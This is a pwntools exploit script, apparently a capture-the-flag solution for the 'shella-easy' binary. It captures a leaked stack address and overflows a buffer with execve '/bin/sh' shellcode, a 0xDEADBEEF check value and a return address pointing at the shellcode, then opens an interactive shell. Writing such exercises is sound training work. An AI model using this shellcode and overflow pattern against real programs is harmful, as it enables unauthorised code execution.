#!/usr/bin/env python3

from pwn import*
#opens up the warmup process
pw = process("./shella-easy")
#attaches a gdb debugger to the program
#gdb.attach(pw, gdbscript = 'b *0xf7fc8579')
#receives the input up until the ">"

payload = b""
shellcode = ""
#This shellcode originates from http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#gdb.attach(pw, gdbscript = 'b *0x8048541')

pw.recvuntil(b"have a")

memval = pw.recv(12)

print(memval)

payload += shellcode

payload +=  b"A" * (64 - len(shellcode))

payload += p32(0xDEADBEEF)

payload += b"B" * 8

payload += p32(int(memval, 16))

payload += b"C" * 100
#payload += cyclic(100)

pw.sendline(payload)

#cyclic_find(64)

#memval = pw.recv(12)

#print(memval)

#print(pw.recvline())

pw.recvline()


#allows you to interact with the program (for example, if you wanted to input a value.)
pw.interactive()
